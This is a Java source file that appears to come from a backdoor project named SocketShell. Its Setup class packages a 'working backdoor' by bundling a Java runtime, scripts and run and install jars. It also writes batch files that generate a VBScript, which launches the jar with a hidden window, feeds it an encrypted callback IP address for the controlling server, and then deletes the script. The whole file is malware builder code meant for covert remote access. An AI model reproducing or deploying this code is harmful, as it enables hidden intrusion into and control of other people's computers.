package com.github.thatcherdev.socketshell;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import org.apache.commons.io.FileUtils;
import com.github.thatcherdev.socketshell.backend.Utils;

public class Setup {

	/**
	 * Copy and create all necesarry files or directories needed for a working
	 * backdoor.
	 *
	 * @param packageJre if the a JRE should be packaged with backdoor
	 * @throws IOException
	 */
	public static void compile(boolean packageJre) throws IOException {
		if (packageJre) {
			String jrePath = System.getProperty("java.home");
			FileUtils.copyDirectory(new File(jrePath + File.separator + "bin"),
					new File("backdoor" + File.separator + "jre" + File.separator + "bin"));
			FileUtils.copyDirectory(new File(jrePath + File.separator + "lib"),
					new File("backdoor" + File.separator + "jre" + File.separator + "lib"));
		} else if (SocketShell.os.contains("Linux") && new File("jre").isDirectory())
			FileUtils.copyDirectory(new File("jre"), new File("backdoor" + File.separator + "jre"));
		FileUtils.copyDirectory(new File("scripts"), new File("backdoor" + File.separator + "scripts"));
		FileUtils.copyFile(new File("target" + File.separator + "run.jar"),
				new File("backdoor" + File.separator + "run.jar"));
		createBat("backdoor" + File.separator + "run.bat", "jre", "run");
		FileUtils.copyFile(new File("target" + File.separator + "install.jar"),
				new File("backdoor" + File.separator + "install.jar"));
		createBat("backdoor" + File.separator + "install.bat", "jre", "install");
	}

	/**
	 * Creates a '.bat' batch file for running a jar file in a Java Runtime
	 * Environment (if packaged with the jar) and suplying the jar with the server's
	 * IP address.
	 *
	 * @param filePath Path of '.bat' batch file to create.
	 * @param jrePath  Path to jre if bundled.
	 * @param jarName  Name of '.jar' file to run.
	 * @throws FileNotFoundException
	 */
	private static void createBat(String filePath, String jrePath, String jarName) throws FileNotFoundException {
		PrintWriter out = new PrintWriter(new File(filePath));
		out.println(
				"@echo off\n%~d0 & cd %~dp0\necho Set objShell = WScript.CreateObject(\"WScript.Shell\")>run.vbs\necho objShell.Run \"cmd /c if exist "
						+ jrePath + "\\ (" + jrePath + "\\bin\\java " + "-jar " + jarName + ".jar "
						+ Utils.crypt(Utils.getIP(), "SocketShellIP") + ") else (java -jar " + jarName + ".jar "
						+ Utils.crypt(Utils.getIP(), "SocketShellIP")
						+ ")\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 1 > nul\n del run.vbs\n @exit\n"
						+ ") else (\ncall:delvbs\n)\ngoto:eof");
		out.flush();
		out.close();
	}
}
